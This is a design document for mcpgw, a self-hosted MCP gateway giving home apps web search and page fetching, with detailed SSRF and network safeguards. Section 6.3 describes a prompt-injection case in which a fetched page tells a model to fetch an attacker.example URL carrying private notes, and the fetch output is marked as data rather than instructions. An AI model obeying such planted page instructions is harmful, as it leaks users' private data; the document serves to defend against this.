# mcpgw: Design

The home cluster's **tool gateway**. llmgw gives apps one place to reach LLMs; mcpgw gives them, and the models
behind llmgw, one place to reach **tools**: web search first, then web fetch, later more. It speaks **MCP** (Model
Context Protocol). For now, only the home apps use it ([ADR 0010](adr/0010-home-apps-only-for-now.md)).

- **Status:** live at `http://mcpgw.mcpgw.svc.cluster.local` since 2026-11-05, called only by the home apps. Progress is in [progress.md](progress.md).
- **First consumer:** homestorm (`~/agentic/homestorm`), the chair-run multi-model meeting app.
- **Sibling:** llmgw (`~/agentic/llm-gateway`, `http://llmgw.llmgw.svc.cluster.local`).
- **See also:** decisions in [adr/](adr/), milestones in [plan.md](plan.md), the log in [progress.md](progress.md).

---

## 1. Why it exists

LLMs only know what was in their training data. Every model behind llmgw (Claude, GPT, DeepSeek) has a cutoff and
no way to look things up. llmgw already passes **function tools** through in OpenAI format (`tools`, `tool_calls`,
`role: "tool"` results; round trips are tested for Claude, GPT and DeepSeek), but it **runs** no tool, and it exposes
no provider's built-in search.

So something has to run the tools. Three places were weighed ([ADR 0002](adr/0002-tool-gateway-beside-llmgw.md)):

| Option | Verdict |
|---|---|
| A standalone SearXNG that each app calls | Rejected: every later tool becomes one more service and one more API, and the pieces get forgotten |
| Tools inside llmgw | Rejected: llmgw holds the Claude and GPT logins and serves every app. A slow fetch or a crashing tool must not take model access down with it, and a code sandbox must never share a process with those credentials |
| **One tool gateway beside llmgw** | **Chosen.** One catalog of tools, one API, separate failure and security boundaries |

**Split of responsibilities:**

| Part | Owner |
|---|---|
| Models: routing, logins, limits, usage | **llmgw** (unchanged) |
| Tools: the catalog and running each tool safely | **mcpgw** |
| When a model may use a tool, the tool loop, who sees the results | **each app** (for homestorm this is meeting control) |

mcpgw never calls an LLM itself, and it never runs an agent loop.

## 2. Scope

**v1 (the MVP):**

- `web_search`: query the web through a self-hosted **SearXNG**, behind a replaceable provider
  ([ADR 0009](adr/0009-search-behind-a-replaceable-provider.md)).
- `web_fetch`: read one URL as clean text, with strict safety rules (§6).
- MCP over **Streamable HTTP** at `/mcp`, the only tool interface
  ([ADR 0005](adr/0005-mcp-only-no-rest-mirror.md)).
- Deployed on k3s by Argo CD from arch-infra, like llmgw and homestorm.

**Later (each needs its own design note first):**

| Item | Notes |
|---|---|
| `code_run` | Sandboxed Python for maths and small data checks. Needs real isolation (a k8s Job with no network, gVisor or similar). The riskiest tool; never in the mcpgw process |
| `docs_search` | Retrieval over the user's own notes and meeting minutes, using llmgw's `/v1/embeddings` |
| Home data, read-only | homecal events, homenews articles, cluster status from Loki |
| Per-client bearer tokens | Before any untrusted device or wider exposure ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)) |
| A REST mirror | Only if a caller turns up that can't use an MCP client |

**Non-goals:** calling LLMs, agent loops, public internet exposure, user accounts, image generation, rendering
JavaScript pages.

## 3. Architecture

```
            ┌──────────── home k3s ─────────────────────────────────────┐
 homestorm ─┼─► llmgw  (models: Claude · GPT · DeepSeek)                  │
  (app)     │                                                            │
            ├─► mcpgw ──► SearXNG ──► Bing · DuckDuckGo · Brave · …      │
            │     │                                                      │
            │     └────► the public web (web_fetch, with the §6 guards)  │
            └────────────────────────────────────────────────────────────┘
```

- **mcpgw:** one stateless Node service (no database in v1).
- **SearXNG:** a second Deployment in the same Argo CD app and namespace. It's an implementation detail: only
  mcpgw talks to it, and apps never see its URL.

**Stack** ([ADR 0001](adr/0001-house-stack.md)): the same as llmgw and homestorm, so one person can keep both in
their head: TypeScript on Node, Hono, zod 4, pino (the house JSON log shape), Vitest, Biome, pnpm. MCP through the
official v2 packages `@modelcontextprotocol/server` and `@modelcontextprotocol/hono`, exact versions pinned
([ADR 0003](adr/0003-mcp-sdk-v2-both-protocol-versions.md)).

## 4. Interfaces

### 4.1 MCP

- **Endpoint:** `POST /mcp`, the MCP **Streamable HTTP** transport, **stateless**: no sessions, and any replica can
  answer. `GET` and `DELETE` return 405; the SDK does this with no code of ours.
- **Protocol versions:** `createMcpHandler` serves `2026-07-28` and the 2025-era versions on one endpoint. Tested:
  Claude Code 2.1.318 uses `server/discover`, `subscriptions/listen`, `tools/list` and `tools/call` at `2026-07-28`;
  Codex 0.166.0 uses `initialize`, `tools/list` and `tools/call` at `2025-06-18`. No resources or prompts in v1.
- **Host and Origin checks** (the spec requires the Origin check):

  ```ts
  const mcp = createMcpHonoApp({
    host: "0.0.0.0",
    allowedHosts: ["mcpgw.mcpgw.svc.cluster.local"],
    allowedOrigins: [],
  });
  ```

  - `allowedOrigins: []` refuses any request carrying an `Origin` with a 403, and clients that send none still pass.
    Nothing in a browser should call mcpgw; homestorm calls it from its API. **Without this setting a hostile Origin
    got a 200**, because binding to all interfaces drops the SDK's defaults.
  - A `Host` not on the list gets a 403. Every name callers use must be listed.

- **Tool results** ([ADR 0004](adr/0004-text-results-app-data-in-meta.md)):
  - `content`: one text block written for a model to read. It carries everything a model needs, including hints such
    as "call again with start=N";
  - `_meta["arch.internal/mcpgw"]`: the same data as JSON, for apps. Models don't see it;
  - no `structuredContent` or `outputSchema`: Claude Code gives its model only the JSON and drops the text block,
    and Codex's model sees both;
  - `isError: true` with a plain-language message that says what to do next, when the tool itself failed (blocked
    URL, timeout, SearXNG down) or the arguments were invalid. Finding nothing isn't an error: it's a normal result
    saying no results were found;
  - an unknown tool or a malformed request stays a JSON-RPC error.
- **Tool annotations,** the same on both tools:

  | Hint | Value | Why |
  |---|---|---|
  | `readOnlyHint` | `true` | Neither tool changes anything on the caller's side. Without it, `codex exec` refused to run the tool; with it, Codex runs it without asking (§6.3) |
  | `destructiveHint` | `false` | |
  | `idempotentHint` | `true` | |
  | `openWorldHint` | `true` | They reach the open web |

### 4.2 Other routes

| Route | Purpose |
|---|---|
| `GET /health` | `{ "status": "ok" }` once the service is up. Also reports `searxng: ok/down` without failing |
| `GET /` | Version and commit, like llmgw |
| `GET /docs` | A read-only status page for people: version, search health, engines that failed in the last hour, the tools and their inputs, how to connect, log queries |

These sit on an outer Hono app, with the MCP app mounted inside it. On the MCP app, a request with a pod-IP `Host`
(what a Kubernetes probe sends) got a 403 in testing, which would fail the probes.

`/docs` isn't Swagger, because Swagger documents REST routes and all of mcpgw's tools sit behind one `POST /mcp`. It's plain
server-rendered HTML with no scripts, built from the same definitions the MCP server registers, so it can't drift. It has the same
Host check as `/mcp`. It has no "try it" box, because `/mcp` refuses every browser `Origin`, including its own.

### 4.3 Request headers

- `X-Request-Id`: if the caller sends one, mcpgw logs it as `request_id` (homestorm sends one per seat turn).
  mcpgw's own `req_id` is returned in `X-Request-Id` on the response.
- `X-Client`: a short caller name such as `homestorm`, logged as `client`. Optional. When it's absent, `client` is the
  first word of `User-Agent`, so MCP clients are named even when they send nothing extra (`claude-code/2.1.318`).

### 4.4 Who can connect

Only the home apps, for now ([ADR 0010](adr/0010-home-apps-only-for-now.md)). There's no Ingress, and a firewall rule on arch
([deploy/host/](../deploy/host/)) drops traffic from other devices addressed to the cluster's ranges
([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)).

On arch, `/etc/hosts` points the name at the pinned Service IP. That only resolves the name, for checks by hand: no harness or
other tool is set up to use it.

| Client | Works? | How |
|---|---|---|
| Home apps | **Yes** | In-cluster, at `http://mcpgw.mcpgw.svc.cluster.local/mcp` |
| Claude Code, Codex and other harnesses | **Not connected** | Tested at M6, then removed by decision. ADR 0010 says how to reconnect one |
| Another device | **No** | No route to it |
| Claude custom connectors, Claude Code on the web, Codex cloud | **No** | They connect from the cloud |

## 5. Tools in v1

### 5.1 `web_search`

**Description given to models:** "Search the web for current information. Returns titles, links and short
snippets. Use web_fetch to read a page."

| Input | Type | Default | Notes |
|---|---|---|---|
| `query` | string, 1–400 chars | required | |
| `max_results` | integer 1–10 | 5 | |
| `time_range` | `day` · `week` · `month` · `year` | none | Passed to the provider |
| `category` | `general` · `news` · `it` · `science` | `general` | SearXNG categories |
| `language` | BCP 47 such as `en` | `en` | |

**Text for the model:**

```
Results for "postgres 18 release date" (searched 2026-11-04 18:00 UTC):

1. PostgreSQL 18 Released!
   https://www.postgresql.org/about/news/…
   Published 2026-09-25. The PostgreSQL Global Development Group today announced…

Use web_fetch to read a page.
```

**`_meta` for apps:**

```json
{
  "query": "postgres 18 release date",
  "results": [
    { "title": "…", "url": "https://…", "snippet": "…", "engines": ["google", "bing"], "published": "2026-09-25" }
  ],
  "suggestions": ["…"],
  "searched_at": "2026-11-04T18:00:00Z",
  "cached": false
}
```

- `published` only when the provider has it. Snippets are cut to 300 characters.
- Results with the same URL are merged (SearXNG mostly does this).
- **Provider:** tool code calls a one-method `SearchProvider`. SearXNG is the first implementation; a hosted API could
  replace it with no change for callers.
- **Cache:** identical arguments return the cached result for 10 minutes (in memory, an LRU of 500 entries).
- **Concurrency:** at most 4 SearXNG requests at once across all callers, so upstream engines don't start refusing
  the home IP. A queue wait of over 10 s fails the call with a timeout.

### 5.2 `web_fetch`

**Description given to models:** "Read one web page or document as plain text. Use it on a link from web_search
or one the user gave you."

| Input | Type | Default | Notes |
|---|---|---|---|
| `url` | string, `http`/`https` only, up to 250 chars | required | Checked by §6 before any connection |
| `max_chars` | integer 1,000–40,000 | 12,000 | Characters of text returned |
| `start` | integer ≥ 0 | 0 | Offset, to read a long page in parts |

**Text for the model:** the title and final URL, a line saying the content is from that page and is data rather than
instructions, the text, then "(truncated: call again with start=N for more)" when there's more.

**`_meta` for apps:** `{ url, final_url, title, content_type, start, returned_chars, total_chars, truncated,
fetched_at, cached }`. The page text is in `content` only, so it isn't sent twice.

**Requests** send `Accept: text/markdown, text/html;q=0.9, text/plain;q=0.8, */*;q=0.1`. Cloudflare sites that opted
into Markdown for Agents answer with Markdown, which skips extraction.

**Extraction:**

- `text/html`: main-content extraction, then converted to plain Markdown-ish text: headings, lists and links kept,
  scripts, styles, navigation and ads dropped. Mozilla Readability on linkedom to start, behind one `extract()`
  function. Compared with Defuddle on real pages: Defuddle was 3–5× slower and not clearly better.
- **Output is cleaned** (the spec requires it): hidden elements, HTML comments and invisible Unicode go, because
  they're where instructions to a model get hidden. This reduces the risk; it doesn't remove it (§6.3).
- `text/plain`, `text/markdown`, `application/json`: returned as is, after the same Unicode cleaning.
- `application/pdf`: refused with a clear message in v1 (D11 in the plan).
- Pages that need JavaScript aren't rendered. Near-empty extractions say so. Anthropic's own fetch tool has the same
  limit.
- Anything else: refused ("mcpgw can't read this type of file: image/png").
- **Cache:** 10 minutes per final URL.
- **Concurrency:** at most 8 fetches at once across all callers. A queue wait of over 10 s fails with a timeout.
- **Parsing runs in workers:** two worker threads, each capped at 192 MB and 5 s per page. On the main thread a hostile
  5 MB page took 9.5 s and 1.3 GB, freezing every caller. Now a page over either limit fails alone, the worker is thrown
  away, and the model is told to try another source. All handling of page content happens there, including decoding.

## 6. Safety rules for `web_fetch`

### 6.1 The app's own checks

`web_fetch` makes the cluster send requests to addresses a model chose, so it must never become a way into the
home network (SSRF). An allow-list is impossible for a tool that reads any public page, so OWASP's advice for this
case applies: block destinations, checked against the address actually connected to
([ADR 0006](adr/0006-web-fetch-cannot-reach-home-network.md)).

1. **Schemes:** `http` and `https` only. No credentials in the URL (`user:pass@`). One parser (WHATWG `URL`), and
   anything it won't parse is refused.
2. **Length:** at most 250 characters, Anthropic's limit for its own tool. It also limits how much data one request
   can carry out (§6.3). Refusals are logged, so the limit can be raised if real pages hit it.
3. **Ports:** 80 and 443 only, plus 8080 and 8443.
4. **Destinations, checked against the resolved IP at connect time** (a custom DNS lookup in the HTTP agent, so DNS
   rebinding can't slip past a pre-check, while keeping the original name for `Host`, TLS and certificate checks):
   - only addresses `ipaddr.js` classes as `unicast` pass, after unwrapping IPv4-mapped forms. The spec warns against
     hand-written IP checks;
   - that refuses `0.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`,
     `192.168.0.0/16`, `224.0.0.0/4`, `240.0.0.0/4`, `::1`, `fc00::/7`, `fe80::/10` and `ff00::/8`. The test table
     (§11) proves each one;
   - names ending in `.local`, `.internal`, `.svc`, `.cluster.local`, or with no dot at all, are refused;
   - Node skips the DNS lookup for an IP written directly in a URL, so those are checked up front as well.
5. **Redirects:** followed by hand, at most 5, and every hop goes through rules 1–4 again.
6. **Limits:** 15 s total, 5 MB downloaded (stop reading past that), decompressed size counted, not the wire size.
7. **Requests are plain:** `GET` only, no cookies kept, a fixed `User-Agent: mcpgw/<version> (home tool gateway)`.
8. **robots.txt:** not enforced in v1 (one page per call, at human pace). Revisit if a site complains.
9. A blocked URL returns `isError: true` with the reason ("private address 192.168.1.10"), and logs
   `fetch.blocked` with the reason. It's never retried.

`web_search` only talks to SearXNG at its fixed cluster address, so these rules don't apply to it.

### 6.2 The network layer

NetworkPolicies are the second layer, in case a bug gets past §6.1:

- **`mcpgw` pods, egress:** DNS to CoreDNS; TCP 8080 to the `searxng` pods; TCP 80, 443, 8080 and 8443 to anywhere
  except `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12` and `192.168.0.0/16`.
- **`searxng` pods:** ingress from `mcpgw` pods only; egress to DNS and to TCP 80 and 443 outside those ranges.

Proven at M4 from inside the pods, with the §6.1 checks out of the way: the node, the router, llmgw, homestorm, the
Kubernetes API and cloud metadata are all refused, and a pod with no policy reaches them.

### 6.3 Keeping data from leaking

SSRF rules protect the home network. They don't stop this
([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md)): a page tells the model to fetch
`https://attacker.example/?data=<private notes>`. That's a public address, so §6.1 allows it. mcpgw is stateless and
can't tell where a URL came from, so the rule has to live with whoever holds the conversation.

| Layer | What it does |
|---|---|
| **Apps** | Allow `web_fetch` only on URLs from the user or from `web_search` results. Not links inside fetched pages, and not URLs the model made up |
| **Harnesses** | Not connected for now ([ADR 0010](adr/0010-home-apps-only-for-now.md)). If that changes, `web_fetch` must ask each time, because those sessions can see code and secrets |
| **App UIs** | Never load images from a model's Markdown: the browser would send the URL with no click |
| **mcpgw** | The URL length limit, cleaned output, and a line marking fetched text as data rather than instructions. These reduce the risk and don't remove it |

## 7. Configuration

| Env var | Default | Purpose |
|---|---|---|
| `PORT` | `3002` | HTTP port |
| `ALLOWED_HOSTS` | `mcpgw.mcpgw.svc.cluster.local` | Accepted `Host` names (dev: `127.0.0.1`) |
| `SEARXNG_URL` | `http://searxng.mcpgw.svc.cluster.local:8080` | SearXNG base URL (dev: `http://127.0.0.1:8180`) |
| `SEARCH_CACHE_TTL_S` | `600` | |
| `SEARCH_CONCURRENCY` | `4` | |
| `FETCH_CONCURRENCY` | `8` | |
| `FETCH_TIMEOUT_MS` | `15000` | |
| `FETCH_MAX_BYTES` | `5242880` | |
| `FETCH_MAX_URL_CHARS` | `250` | |
| `FETCH_CACHE_TTL_S` | `600` | |
| `LOG_LEVEL` | `info` | |

**SearXNG `settings.yml`** (a ConfigMap):

- `search.formats: [html, json]`: JSON must be turned on explicitly.
- `server.limiter: false`: only mcpgw calls it, from inside the cluster.
- `server.secret_key` from the env var `SEARXNG_SECRET`, a random value the pod generates at boot. Nothing signed with
  it outlives the pod, since the limiter and image proxy are off, so there's no Kubernetes Secret.
- Engines: bing, duckduckgo, brave, wikipedia, github, stackoverflow, arxiv, bing news, duckduckgo news. The rest stay
  off to keep upstream traffic low. Google is off because it refused every query from this IP.
- Image: `searxng/searxng`, pinned to a dated tag such as `2026.11.5-3e95f6cd2`, never `latest`.

## 8. Deployment

- **Repo:** `autumnfallenwang/mcpgw`, public like the sibling apps (no secrets in it). Local checkout
  `~/agentic/mcpgw`.
- **Images:** `ghcr.io/autumnfallenwang/mcpgw:<git sha>`, built by GitHub Actions on main. CI runs lint, typecheck
  and tests first, then builds. A bump job updates arch-infra if `ARCH_INFRA_TOKEN` is set; otherwise bump by
  hand (homestorm's current practice).
- **Kubernetes (namespace `mcpgw`), one Helm chart at `deploy/chart`:**
  - Deployment `mcpgw` (1 replica to start; stateless, so more is safe) on container port 3002, and Service `mcpgw`
    on port 80, like llmgw. Probes on `/health`;
  - Deployment `searxng` and Service `searxng:8080`, cluster-internal only;
  - ConfigMap `searxng-settings`, from `deploy/chart/files/settings.yml`;
  - the §6.2 NetworkPolicies;
  - no Ingress, for either Deployment ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)), and Service `mcpgw`'s IP is pinned.
- **Argo CD:** `apps/mcpgw.yaml` in arch-infra (the root app-of-apps), review copy in `deploy/arch-infra/`, tags
  pinned to the image SHA.
- **Resources:** mcpgw uses about 75 MB and SearXNG about 100 MB. Both request 128 MB. mcpgw's limit is 512 MB, enough for
  the main thread plus both workers at their caps.
- **Local dev:** `docker run -p 127.0.0.1:8180:8080 -e SEARXNG_SECRET=dev -v ./deploy/chart/files:/etc/searxng:ro
  searxng/searxng:<tag>`, then `ALLOWED_HOSTS=127.0.0.1 SEARXNG_URL=http://127.0.0.1:8180 pnpm dev` on port 3002.

## 9. Logging and tracing

One JSON object per line, the same shape as llmgw and homestorm (`level`, `time`, `service: "mcpgw"`, `version`,
`event`, `req_id`, `msg`). Nothing is printed outside the logger, so Loki sees only JSON.

| Event | Fields |
|---|---|
| `server.start` | `port`, `searxng_url` |
| `http.request` | `method`, `path`, `status`, `latency_ms`, `client`, `request_id` |
| `tool.call` | `tool`, `client`, `request_id`, `status` (`ok` / `error` / `blocked` / `timeout`), `duration_ms`, `cached`, and `results` (search) or `bytes` and `final_host` (fetch) |
| `fetch.blocked` | `reason`, `host` |
| `searxng.error` | `status`, `engine_errors` |

- Search queries are logged at `info` (household-internal and useful for debugging). Fetched page text is never
  logged, and neither are full fetch URLs, since a query string can carry private data.
- Query in Loki: `{namespace="mcpgw"} | json | event="tool.call"`. As with llmgw, `req_id` is a JSON field, not a
  Loki label.

## 10. How apps use it, with homestorm as the example

homestorm uses **both** gateways: llmgw for every model call, mcpgw for every tool call. It stays in charge of
when tools are used. It reaches mcpgw through the `@modelcontextprotocol/client` package, as
[dev/harness-check/client.mjs](../dev/harness-check/client.mjs) does.

**a) Chair search, no model involved.** The chair types a query in a "Search the web" action. homestorm calls
`web_search` and posts the results into the meeting record as one "Sources" message, built from `_meta`. Every seat
sees the same sources, which keeps blind rounds fair.

**b) Seat tools, the model decides.** For a seat the chair allowed to search:

1. homestorm calls `tools/list` once (cached), converts each tool to OpenAI function format, and passes
   `web_search` and `web_fetch` to llmgw in `tools`.
2. The model streams. If it ends with `finish_reason: "tool_calls"`, homestorm checks each call against the URL rule
   (§6.3), runs it with `tools/call`, appends the assistant `tool_calls` message and one `role: "tool"` message per
   result, and calls llmgw again.
3. It repeats up to a per-turn limit (for example 3 tool calls), then asks for the final answer without tools.
4. The searches and fetched links show under the seat's answer, and enter the record, so the other seats can see
   which sources it used.

Built in homestorm at M5. Testing with thinking on added three rules: "must search" forces `web_search` by name; text before
a tool call isn't the answer; and when the calls are used up, the final answer gets the research as plain text with no
tools at all, since `tool_choice: "none"` made DeepSeek write raw tool markup into the answer and Claude Opus return nothing.

**c) MCP harnesses** aren't connected for now (§4.4).

## 11. Testing

- **Unit:** argument schemas; result formatting (the text block and `_meta`); the §6 address rules, with a table of
  allowed and blocked URLs including IPv6, mapped forms and IPs written directly in URLs; redirect re-checks;
  truncation and `start`.
- **Integration:** a fake SearXNG (a small HTTP server returning canned JSON) and a local HTTP server for fetch
  (HTML, a redirect chain, a too-large body, a slow body). The MCP endpoint:
  - through the SDK's v2 client: `tools/list`, `tools/call`, and reading `_meta`;
  - with raw `POST`s for each protocol version, so the 2025 path can't silently break;
  - the guards: wrong `Host` 403, any `Origin` 403, `GET` and `DELETE` 405, and `/health` 200 with a pod-IP `Host`.
- **Live, opt-in** (`pnpm test:live`): real SearXNG and one real page fetch, plus one llmgw round trip per family
  (Claude, GPT, DeepSeek) where the model calls `web_search` and answers from its result.
- **Harness check:** the record of testing real Claude Code and Codex is in [dev/harness-check/](../dev/harness-check/). Re-run it
  if a harness is ever reconnected, because which block a harness shows its model isn't set by the spec.

## 12. Build order

Milestones and their finish lines are in [plan.md](plan.md). The skeleton deploys first, because the real network
path is the one thing the tests so far couldn't cover.

## 13. Keeping track of the pieces

- Add a **services table** to arch-infra's README: each service, what it's for, its URL and its repo. At least
  llmgw (models), mcpgw (tools), and the apps.
- mcpgw's README states the split in its first lines: models live in llmgw, tools live here, loops live in apps.

## 14. Open questions

1. **SearXNG engine mix.** Measured on 2026-11-06, and it's the main weakness: Bing returns off-topic results, and most other
   engines refuse the home IP. Fixing it is [M9 in the plan](plan.md).
2. **Sites that refuse mcpgw.** Stack Overflow, Medium, npm, AP, Allrecipes and Zhihu answer 403 to its plain `User-Agent`. It's
   reported, not worked around.
3. **Hosted fallback.** Decided by M9's benchmark ([ADR 0009](adr/0009-search-behind-a-replaceable-provider.md)).

## 15. Standards and sources

| Source | What it covers |
|---|---|
| **External standards** | MCP `2026-07-28` plus 2025-era compatibility; JSON Schema for tool inputs; the OpenAI tool format on the llmgw side; OWASP's SSRF guidance |
| **House standards** | Hono, zod, pino JSON logs, Vitest, Biome, pnpm; Helm, GHCR, arch-infra and Argo CD; plan, progress and ADR docs |
| **Our own design** | The split in §1; tool arguments and result text; fetch limits; caching; the `_meta` key; each app's tool policy |

**What the MCP spec requires of a server like this:** implement `server/discover` (the SDK does); validate `Origin`
and answer 403 when it's invalid; validate tool inputs; apply access controls; rate-limit tool calls; clean tool
outputs. It also says servers *should* authenticate. mcpgw doesn't, and is unreachable from other devices instead ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)).

**Sources:**

- MCP spec `2026-07-28`: [changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog),
  [Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http),
  [tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools),
  [versioning](https://modelcontextprotocol.io/specification/2026-07-28/basic/versioning),
  [security](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices),
  [schema](https://modelcontextprotocol.io/specification/2026-07-28/schema)
- SDK: [TypeScript SDK](https://github.com/modelcontextprotocol/typescript-sdk),
  [Hono guide](https://ts.sdk.modelcontextprotocol.io/v2/serving/hono.html),
  [protocol support](https://ts.sdk.modelcontextprotocol.io/v2/migration/support-2026-07-28.html)
- Clients: [Claude custom connectors](https://support.claude.com/en/articles/11175166-getting-started-with-custom-connectors-using-remote-mcp),
  [Claude Code MCP](https://code.claude.com/docs/en/mcp), [Codex MCP](https://developers.openai.com/codex/mcp)
- Fetch safety: [OWASP SSRF cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html),
  [Anthropic web fetch docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool),
  [Simon Willison on the bypass](https://simonwillison.net/2026/jul/15/claude-web-fetch-exfiltration)
- Tool design and extraction: [Anthropic on writing tools](https://www.anthropic.com/engineering/writing-tools-for-agents),
  [Cloudflare Markdown for Agents](https://developers.cloudflare.com/fundamentals/reference/markdown-for-agents/)
- Search (secondary, mostly forums and vendors): [You.com on SearXNG](https://you.com/resources/searxng-alternatives),
  [Apidog free search APIs](https://apidog.com/blog/free-web-search-api/)
